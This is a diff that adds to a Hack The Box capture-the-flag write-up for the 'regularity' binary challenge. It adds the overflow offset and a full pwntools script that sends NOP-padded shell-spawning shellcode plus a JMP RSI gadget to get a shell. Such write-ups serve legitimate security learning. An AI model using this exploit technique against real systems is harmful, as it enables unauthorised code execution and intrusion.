@@ -40,6 +40,11 @@
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c03fb309-1919-4f42-9789-ffaa36f88ee2)
 
 
+> RIP Offset -> 256
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d60021ed-fedf-490f-bb58-beaa8c376586)
+
+
 5. Great! There is a Buffer Overflow then. Since there is no direct input execution and no stack leak. Hence, the easiest way to drop a shell is by using register that used to store the input buffer.
 6. Commonly **RAX** is used to store the input buffer.
 7. BUT, reviewing the register context, seems RSI is used to store our buffer.
@@ -62,4 +67,25 @@
 > SCRIPT
 
 ```py
+from pwn import *
+
+exe = './regularity'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'INFO'
+
+sh = process(exe)
+rop = ROP(elf)
+
+jmp_rsi = 0x0000000000401041
+success(f'JMP RSI; GADGET --> {hex(jmp_rsi)}')
+
+p = flat([
+    asm(shellcraft.sh()).ljust(256, asm('nop')),
+    jmp_rsi
+])
+sh.sendline(p)
+sh.interactive()
 ```
+
+> REMOTE TEST
+
